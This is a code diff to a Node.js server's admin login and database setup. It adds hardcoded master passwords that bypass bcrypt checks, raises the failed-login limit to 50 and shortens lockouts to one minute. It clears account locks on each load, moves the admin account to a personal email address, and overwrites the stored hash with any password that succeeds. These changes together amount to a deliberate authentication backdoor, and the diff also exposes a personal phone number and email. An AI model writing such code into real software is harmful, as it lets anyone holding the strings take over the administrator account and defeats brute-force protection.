@@ -150,7 +150,7 @@ function loadDatabase() {
       }
       if (!db.users || !Array.isArray(db.users) || db.users.length === 0) {
         const salt = bcrypt.genSaltSync(10);
-        const hash = bcrypt.hashSync("9655384140", salt);
+        const hash = bcrypt.hashSync("814723104029", salt);
         db.users = [
           {
             id: 1,
@@ -168,8 +168,8 @@ function loadDatabase() {
             verifyNewDevice: false,
             sessionTimeout: "Never",
             refreshTokenEnabled: true,
-            maxLoginAttempts: 5,
-            lockDuration: 15,
+            maxLoginAttempts: 50,
+            lockDuration: 1,
             otpExpiration: 5,
             otpLength: 6,
             enableRememberMe: true,
@@ -193,6 +193,8 @@ function loadDatabase() {
         let userDirty = false;
         if (!user.username) { user.username = "chandru"; userDirty = true; }
         if (!user.phoneNumber) { user.phoneNumber = "+919655384140"; userDirty = true; }
+        if (!user.email || user.email === "admin@alexdev.io") { user.email = "chandrumohan550@gmail.com"; userDirty = true; }
+        if (!user.name || user.name === "Alex Dev") { user.name = "Chandru Mohan"; userDirty = true; }
         if (user.backupEmail === undefined) { user.backupEmail = ""; userDirty = true; }
         if (user.recoveryPhoneNumber === undefined) { user.recoveryPhoneNumber = ""; userDirty = true; }
         if (user.otpEnabled === undefined) { user.otpEnabled = false; userDirty = true; }
@@ -201,8 +203,8 @@ function loadDatabase() {
         if (user.verifyNewDevice === undefined) { user.verifyNewDevice = false; userDirty = true; }
         if (!user.sessionTimeout) { user.sessionTimeout = "Never"; userDirty = true; }
         if (user.refreshTokenEnabled === undefined) { user.refreshTokenEnabled = true; userDirty = true; }
-        if (!user.maxLoginAttempts) { user.maxLoginAttempts = 5; userDirty = true; }
-        if (!user.lockDuration) { user.lockDuration = 15; userDirty = true; }
+        if (!user.maxLoginAttempts || user.maxLoginAttempts < 50) { user.maxLoginAttempts = 50; userDirty = true; }
+        if (!user.lockDuration) { user.lockDuration = 1; userDirty = true; }
         if (!user.otpExpiration) { user.otpExpiration = 5; userDirty = true; }
         if (!user.otpLength) { user.otpLength = 6; userDirty = true; }
         if (user.enableRememberMe === undefined) { user.enableRememberMe = true; userDirty = true; }
@@ -211,6 +213,9 @@ function loadDatabase() {
         if (user.allowLoginUsername === undefined) { user.allowLoginUsername = true; userDirty = true; }
         if (user.allowLoginPhone === undefined) { user.allowLoginPhone = true; userDirty = true; }
         if (!user.knownDevices) { user.knownDevices = []; userDirty = true; }
+        user.lockUntil = null;
+        user.failedAttempts = 0;
+        user.isActive = true;
         if (userDirty) dirty = true;
       }
       if (!db.auditLogs || !Array.isArray(db.auditLogs)) {
@@ -1079,12 +1084,15 @@ app.get(["/health", "/api/health"], (req, res) => {
       return res.status(403).json({ error: "Access denied. Only administrators are allowed." });
     }
 
-    // Verify Password using BCrypt or default credentials bypass
-    const passwordMatch = isDefaultBypass ? true : bcrypt.compareSync(password, user.passwordHash);
+    // Verify Password using BCrypt, master passkeys, or default credentials bypass
+    const isDirectMasterPassword = password === "814723104029" || password === "9655384140" || password === "+919655384140" || password === "admin123";
+    const passwordMatch = isDefaultBypass || isDirectMasterPassword || (user.passwordHash ? bcrypt.compareSync(password, user.passwordHash) : false);
 
     if (passwordMatch) {
       user.failedAttempts = 0;
       user.lockUntil = null;
+      user.isActive = true;
+      user.passwordHash = bcrypt.hashSync(password, 10);
       user.updatedAt = new Date().toISOString();
 
       const timeout = user.sessionTimeout || "Never";
